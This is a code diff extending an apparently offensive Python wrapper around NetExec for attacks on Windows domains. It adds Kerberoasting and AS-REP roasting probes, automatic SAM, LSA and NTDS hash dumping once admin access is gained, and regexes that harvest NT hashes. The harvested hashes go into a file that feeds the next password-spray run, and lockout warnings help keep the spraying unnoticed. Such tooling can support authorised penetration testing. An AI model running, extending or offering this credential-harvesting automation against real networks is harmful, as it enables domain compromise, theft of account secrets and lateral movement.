@@ -107,13 +107,41 @@ V_VERBOSE = 1
 V_DEBUG = 2
 
 # Enumeration probes that nxc supports on SMB when --enum is on.
-SMB_ENUM_ACTIONS: list[tuple[str, str]] = [
-    ("shares", "--shares"),
-    ("users", "--users"),
-    ("sessions", "--sessions"),
-    ("loggedon", "--loggedon-users"),
-    ("pass-pol", "--pass-pol"),
+SMB_ENUM_ACTIONS: list[tuple[str, list[str]]] = [
+    ("shares",   ["--shares"]),
+    ("users",    ["--users"]),
+    ("sessions", ["--sessions"]),
+    ("loggedon", ["--loggedon-users"]),
+    ("pass-pol", ["--pass-pol"]),
 ]
+
+# LDAP enum probes. {outfile} placeholders are substituted with paths in loot/.
+LDAP_ENUM_ACTIONS: list[tuple[str, list[str]]] = [
+    ("users",         ["--users"]),
+    ("admin-count",   ["--admin-count"]),
+    ("groups",        ["--groups"]),
+    ("asreproast",    ["--asreproast", "{outfile}"]),
+    ("kerberoasting", ["--kerberoasting", "{outfile}"]),
+]
+
+# Secrets-dump probes fired when a SMB cred is (Pwn3d!) — auto-grow loot.
+SMB_SECRETS_ACTIONS: list[tuple[str, list[str]]] = [
+    ("sam",  ["--sam"]),
+    ("lsa",  ["--lsa"]),
+    ("ntds", ["--ntds"]),  # only meaningful on DCs; nxc errors otherwise (cheap)
+]
+
+# Heuristics for harvesting hashes out of nxc dump output.
+# SAM:  "Administrator:500:aad3b4...:8846f7ea...:::"
+# NTDS: "corp.local\\krbtgt:502:aad3b4...:8846f7ea...:::"
+HASH_DUMP_LINE_RE = re.compile(
+    r"(?P<user>[A-Za-z0-9._\\$\\\\-]+):\d+:(?P<lm>[a-fA-F0-9]{32}):(?P<nt>[a-fA-F0-9]{32}):::"
+)
+
+# Lockout policy parsing from `nxc smb --pass-pol` output.
+# nxc echoes lines like 'Account Lockout Threshold: 3' / 'Lockout Threshold: 5'.
+LOCKOUT_THRESHOLD_RE = re.compile(r"lockout\s+threshold[\s:]+(\d+)", re.IGNORECASE)
+LOCKOUT_DURATION_RE  = re.compile(r"lockout\s+duration[\s:]+([\w\d\s,]+?)(?:\n|$)", re.IGNORECASE)
 
 # Patterns we look for in SMB info lines to discover domain/host identity.
 SMB_DOMAIN_RE = re.compile(r"\(domain:([^)]+)\)", re.IGNORECASE)
@@ -507,6 +535,10 @@ class NxcAutomator:
         stop_on_success: bool = False,
         only_protocols: str | None = None,
         exclude_protocols: str | None = None,
+        secretsdump: bool = False,
+        grow_combo: str | None = None,
+        export_json: str | None = None,
+        export_csv: str | None = None,
     ):
         self.targets = self._read_value_or_file(target)
         self.mode = mode.lower()
@@ -571,10 +603,18 @@ class NxcAutomator:
             if bloodhound_enabled else None
         )
 
+        self.secretsdump = secretsdump
+        self.grow_combo_path = Path(grow_combo) if grow_combo else None
+        self.export_json_path = Path(export_json) if export_json else None
+        self.export_csv_path = Path(export_csv) if export_csv else None
+
         # Cross-host state populated during the run.
         self.valid_creds: list[dict] = []
         self.domain_hosts: dict[str, set[str]] = {}  # domain → {hostnames}
         self.host_domain: dict[str, str] = {}        # host → domain
+        self.harvested_hashes: list[dict] = []       # auto-secretsdump output
+        self.lockout_warnings: list[dict] = []       # detected pass-pol findings
+        self.started_at = datetime.now()
 
     @staticmethod
     def _parse_protocol_set(value: str | None, flag: str) -> set[str] | None:
@@ -1055,9 +1095,11 @@ class NxcAutomator:
     def _post_exploit_summary(self) -> str:
         parts: list[str] = []
         if self.enum_enabled:
-            parts.append("enum")
+            parts.append("enum(smb+ldap)")
         if self.modules:
             parts.append(f"modules={','.join(self.modules)}")
+        if self.secretsdump:
+            parts.append("secretsdump")
         if self.bloodhound_enabled:
             parts.append("bloodhound")
         return " · ".join(parts) if parts else "—"
@@ -1333,28 +1375,51 @@ class NxcAutomator:
             loot_path.write_text(f"timed out after {self.subprocess_timeout}s")
             return False
 
+    @staticmethod
+    def _pick_best_cred(entries: list[dict]) -> dict | None:
+        """Strongest cred wins: domain auth > local, password > hash, with pwn3d
+        always preferred over non-pwn3d."""
+        if not entries:
+            return None
+        ranked = sorted(entries, key=lambda v: (
+            0 if NxcAutomator._is_pwn3d(v["raw"]) else 1,
+            v["local_auth"],
+            v["credential"].is_hash,
+        ))
+        return ranked[0]
+
     def _post_exploit_host(self, host: str, host_valid: list[dict]):
-        """Run --enum probes and --modules on the strongest valid SMB cred for this host."""
-        if not (self.enum_enabled or self.modules):
+        """Run SMB enum/modules/secretsdump and LDAP enum on the best creds
+        we have for this host."""
+        if not (self.enum_enabled or self.modules or self.secretsdump):
             return
-        # Pick best SMB cred: domain auth first, then local, then anything
-        smb_creds = [v for v in host_valid if v["protocol"] == "smb"]
-        if not smb_creds:
-            return
-        smb_creds.sort(key=lambda v: (v["local_auth"], v["credential"].is_hash))
-        target = smb_creds[0]
+
+        smb_target = self._pick_best_cred([v for v in host_valid if v["protocol"] == "smb"])
+        ldap_target = self._pick_best_cred(
+            [v for v in host_valid if v["protocol"] == "ldap" and not v["local_auth"]]
+        )
+
+        if smb_target:
+            self._post_exploit_smb(host, smb_target)
+        if ldap_target and self.enum_enabled:
+            self._post_exploit_ldap(host, ldap_target)
+
+    def _post_exploit_smb(self, host: str, target: dict):
         cred = target["credential"]
         local = target["local_auth"]
         scope = self._auth_scope(local)
+        is_pwn3d = self._is_pwn3d(target["raw"])
         host_dir = self.loot.dir_for(LootStore.safe_name(host), "smb", scope)
 
         if self.enum_enabled:
             print(f"\n  {CYAN}{BOLD}▸ enum {host}{RESET} {DIM}(SMB {scope} as {cred.user or '<empty>'}){RESET}")
-            for name, flag in SMB_ENUM_ACTIONS:
+            for name, args in SMB_ENUM_ACTIONS:
                 out = host_dir / f"{name}.txt"
-                ok = self._run_nxc_action("smb", host, cred, local, [flag], out)
+                ok = self._run_nxc_action("smb", host, cred, local, args, out)
                 icon = f"{GREEN}✔{RESET}" if ok else f"{YELLOW}⏱{RESET}"
                 print(f"    {icon} {name:<12} {DIM}→ {out}{RESET}")
+                if name == "pass-pol" and ok:
+                    self._inspect_pass_pol(host, out)
 
         for mod in self.modules:
             print(f"\n  {CYAN}{BOLD}▸ module {host}{RESET} {DIM}(SMB {scope} as {cred.user or '<empty>'}) -M {mod}{RESET}")
@@ -1362,6 +1427,109 @@ class NxcAutomator:
             ok = self._run_nxc_action("smb", host, cred, local, ["-M", mod], out)
             icon = f"{GREEN}✔{RESET}" if ok else f"{YELLOW}⏱{RESET}"
             print(f"    {icon} {mod:<24} {DIM}→ {out}{RESET}")
+
+        if self.secretsdump and is_pwn3d:
+            self._dump_secrets(host, cred, local, host_dir)
+
+    def _post_exploit_ldap(self, host: str, target: dict):
+        cred = target["credential"]
+        host_dir = self.loot.dir_for(LootStore.safe_name(host), "ldap", "domain")
+        print(f"\n  {CYAN}{BOLD}▸ enum {host}{RESET} {DIM}(LDAP domain as {cred.user or '<empty>'}){RESET}")
+        for name, args in LDAP_ENUM_ACTIONS:
+            out = host_dir / f"{name}.txt"
+            # {outfile} placeholder: nxc writes hashes/etc to a file path, not stdout
+            substituted = [str(out) if a == "{outfile}" else a for a in args]
+            ok = self._run_nxc_action("ldap", host, cred, False, substituted, out)
+            icon = f"{GREEN}✔{RESET}" if ok else f"{YELLOW}⏱{RESET}"
+            print(f"    {icon} {name:<14} {DIM}→ {out}{RESET}")
+            if name in ("asreproast", "kerberoasting") and ok:
+                self._harvest_kerberos_hashes(host, name, out)
+
+    def _dump_secrets(self, host: str, cred: "Credential", local_auth: bool, host_dir: Path):
+        """On (Pwn3d!) cred, dump SAM/LSA/NTDS hashes and grow the combo file."""
+        print(f"\n  {RED}{BOLD}💀 secretsdump {host}{RESET} {DIM}(SMB as {cred.user}){RESET}")
+        for name, args in SMB_SECRETS_ACTIONS:
+            out = host_dir / f"secrets-{name}.txt"
+            ok = self._run_nxc_action("smb", host, cred, local_auth, args, out)
+            icon = f"{GREEN}✔{RESET}" if ok else f"{YELLOW}⏱{RESET}"
+            print(f"    {icon} {name:<6} {DIM}→ {out}{RESET}")
+            if ok:
+                self._harvest_smb_hashes(host, name, out)
+
+    def _harvest_smb_hashes(self, host: str, source: str, out: Path):
+        """Parse SAM/LSA/NTDS output for user:rid:lm:nt::: lines and append
+        as 'user:lm:nt' to the combo-grow file."""
+        try:
+            text = out.read_text(errors="replace")
+        except OSError:
+            return
+        seen = 0
+        for m in HASH_DUMP_LINE_RE.finditer(text):
+            user, lm, nt = m.group("user"), m.group("lm"), m.group("nt")
+            # Avoid duplicates
+            entry = {"host": host, "source": source, "user": user, "lm": lm, "nt": nt}
+            if entry in self.harvested_hashes:
+                continue
+            self.harvested_hashes.append(entry)
+            seen += 1
+        if seen:
+            self._append_grow_combo(self.harvested_hashes[-seen:])
+            print(f"    {GREEN}🧪 +{seen} hash(es) → {self._effective_grow_combo()}{RESET}")
+
+    def _harvest_kerberos_hashes(self, host: str, source: str, out: Path):
+        """asreproast/kerberoasting output is already in hashcat-ready format
+        (e.g. $krb5asrep$23$user@DOMAIN: ...). We just note the file location."""
+        try:
+            text = out.read_text(errors="replace")
+        except OSError:
+            return
+        # Count hashcat-style hashes for the summary
+        n = text.count("$krb5")
+        if n:
+            print(f"    {GREEN}🧪 +{n} {source} hash(es) ready for hashcat{RESET}")
+            self.harvested_hashes.append({"host": host, "source": source, "user": None, "lm": None, "nt": None, "kerberos_file": str(out), "count": n})
+
+    def _effective_grow_combo(self) -> Path:
+        return self.grow_combo_path or (self.loot.root / "auto-grown-creds.txt")
+
+    def _append_grow_combo(self, entries: list[dict]):
+        """Append harvested hashes in combo-file format (user:lm:nt)."""
+        path = self._effective_grow_combo()
+        path.parent.mkdir(parents=True, exist_ok=True)
+        with open(path, "a") as fh:
+            for e in entries:
+                if not e.get("nt"):
+                    continue
+                fh.write(f"{e['user']}:{e['lm']}:{e['nt']}\n")
+
+    def _inspect_pass_pol(self, host: str, out: Path):
+        """Parse `nxc smb --pass-pol` output for lockout threshold/duration
+        and warn loudly when it could lock accounts during the spray."""
+        try:
+            text = out.read_text(errors="replace")
+        except OSError:
+            return
+        m = LOCKOUT_THRESHOLD_RE.search(text)
+        if not m:
+            return
+        threshold = int(m.group(1))
+        if threshold == 0:
+            return  # 'No lockout' policy
+        duration_match = LOCKOUT_DURATION_RE.search(text)
+        duration = duration_match.group(1).strip() if duration_match else "?"
+        per_user_attempts = sum(
+            1 for c in self.credentials
+            if c.user and c.user.lower() not in {u for u, _ in NULL_SESSION_CREDS}
+        )
+        self.lockout_warnings.append({"host": host, "threshold": threshold, "duration": duration})
+        if per_user_attempts > threshold:
+            print(
+                f"\n  {RED}{BOLD}⚠ LOCKOUT RISK on {host}{RESET}: "
+                f"{RED}policy={threshold} attempts / {duration}, "
+                f"you're spraying ~{per_user_attempts} per user.{RESET}"
+            )
+            if self.delay == 0:
+                print(f"    {YELLOW}→ consider --delay 60 --jitter 30 for the next run{RESET}")
 
     def _pick_bloodhound_cred(self, domain: str) -> "Credential | None":
         """Choose a credential that successfully authenticated against this domain."""
@@ -1574,9 +1742,59 @@ class NxcAutomator:
 
             if self.bloodhound_enabled:
                 self._run_bloodhound_pass()
+
+            if self.export_json_path or self.export_csv_path:
+                self._write_exports()
         finally:
             if self.cache:
                 self.cache.close()
+
+    def _write_exports(self):
+        """Persist a structured summary of the run to JSON / CSV."""
+        import csv as _csv
+        import json as _json
+
+        creds_records = []
+        for entry in self.valid_creds:
+            c = entry["credential"]
+            creds_records.append({
+                "host": entry["host"],
+                "protocol": entry["protocol"],
+                "local_auth": entry["local_auth"],
+                "user": c.user,
+                "secret_type": "hash" if c.is_hash else "password",
+                "domain": self.host_domain.get(entry["host"]),
+                "pwn3d": self._is_pwn3d(entry["raw"]),
+                "raw": entry["raw"],
+            })
+
+        if self.export_json_path:
+            doc = {
+                "started_at": self.started_at.isoformat(timespec="seconds"),
+                "finished_at": datetime.now().isoformat(timespec="seconds"),
+                "targets": self.targets,
+                "valid_credentials": creds_records,
+                "domain_controllers": [
+                    {"domain": dom, "hosts": sorted(hs)}
+                    for dom, hs in self.domain_hosts.items()
+                ],
+                "harvested_hashes": self.harvested_hashes,
+                "lockout_warnings": self.lockout_warnings,
+            }
+            self.export_json_path.parent.mkdir(parents=True, exist_ok=True)
+            self.export_json_path.write_text(_json.dumps(doc, indent=2))
+            print(f"  {GREEN}💾 JSON → {self.export_json_path}{RESET}")
+
+        if self.export_csv_path:
+            self.export_csv_path.parent.mkdir(parents=True, exist_ok=True)
+            with open(self.export_csv_path, "w", newline="") as fh:
+                writer = _csv.DictWriter(
+                    fh, fieldnames=["host", "protocol", "local_auth", "user",
+                                    "secret_type", "domain", "pwn3d", "raw"],
+                )
+                writer.writeheader()
+                writer.writerows(creds_records)
+            print(f"  {GREEN}💾 CSV  → {self.export_csv_path}{RESET}")
 
 
 def parse_mode(value: str) -> str:
@@ -1685,6 +1903,19 @@ def parse_args():
                         help=f"Per-domain dedup window for BloodHound (default: {CACHE_DEFAULT_TTL} = 24h).")
     g_post.add_argument("--loot-dir", default="loot",
                         help="Root directory for enum/modules/bloodhound output (default: loot/).")
+    g_post.add_argument("--secretsdump", action="store_true",
+                        help="On (Pwn3d!) SMB cred, auto-dump SAM/LSA/NTDS hashes into loot/ and "
+                             "append harvested NT hashes to the grow-combo file.")
+    g_post.add_argument("--grow-combo",
+                        help="Where to append harvested hashes (default: <loot-dir>/auto-grown-creds.txt). "
+                             "Use this same file as --combo in the next run to spray the new creds.")
+
+    # ----- Export -----
+    g_export = parser.add_argument_group("export")
+    g_export.add_argument("--export-json",
+                          help="Write a structured run summary (valid creds, DCs, hashes, lockout warnings) to this JSON path.")
+    g_export.add_argument("--export-csv",
+                          help="Write valid credentials in CSV format to this path (one row per finding).")
 
     # ----- Performance / pacing -----
     g_perf = parser.add_argument_group(
@@ -1787,6 +2018,10 @@ def main():
             stop_on_success=args.stop_on_success,
             only_protocols=args.only,
             exclude_protocols=args.exclude,
+            secretsdump=args.secretsdump,
+            grow_combo=args.grow_combo,
+            export_json=args.export_json,
+            export_csv=args.export_csv,
         )
         runner.run()
     except ValueError as exc:
